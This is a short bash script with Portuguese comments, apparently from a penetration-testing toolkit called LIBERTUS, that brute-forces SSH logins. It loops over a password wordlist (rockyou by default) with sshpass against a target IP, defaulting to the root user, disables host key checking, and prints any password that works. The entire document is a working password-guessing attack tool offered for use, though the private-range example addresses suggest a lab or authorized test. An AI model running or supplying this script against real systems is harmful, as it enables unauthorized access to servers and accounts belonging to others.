#!/usr/bin/env bash
# LIBERTUS — bruteforce SSH local (fallback do hydra, que está sem módulo SSH)
# Uso: sshbrute.sh IP [USER] [WORDLIST]
#   sshbrute.sh 192.168.100.10               # root + rockyou
#   sshbrute.sh 192.168.100.10 auditor       # user + rockyou
#   sshbrute.sh 192.168.100.10 admin pass.txt
set -u
IP="${1:?uso: sshbrute.sh IP [USER] [WORDLIST]}"
USER="${2:-root}"
WL="${3:-/usr/share/wordlists/rockyou.txt}"
SSHPASS="$HOME/.local/bin/sshpass"
[ -x "$SSHPASS" ] || SSHPASS="$(command -v sshpass || true)"
[ -n "$SSHPASS" ] || { echo "ERRO: sshpass nao encontrado"; exit 1; }
[ -f "$WL" ] || { echo "ERRO: wordlist nao existe: $WL"; exit 1; }

echo "[*] Alvo: $USER@$IP  wordlist: $WL"
n=0
while IFS= read -r P; do
  n=$((n+1))
  if "$SSHPASS" -p "$P" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
      -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      "$USER@$IP" 'echo PWNED' 2>/dev/null | grep -q PWNED; then
    echo "[+] SENHA ENCONTRADA -> $USER:$P  (linha $n)"
    exit 0
  fi
  [ $((n % 50)) -eq 0 ] && echo "    ... $n tentativas"
done < "$WL"
echo "[-] Nenhuma senha encontrada em $n tentativas"
exit 1
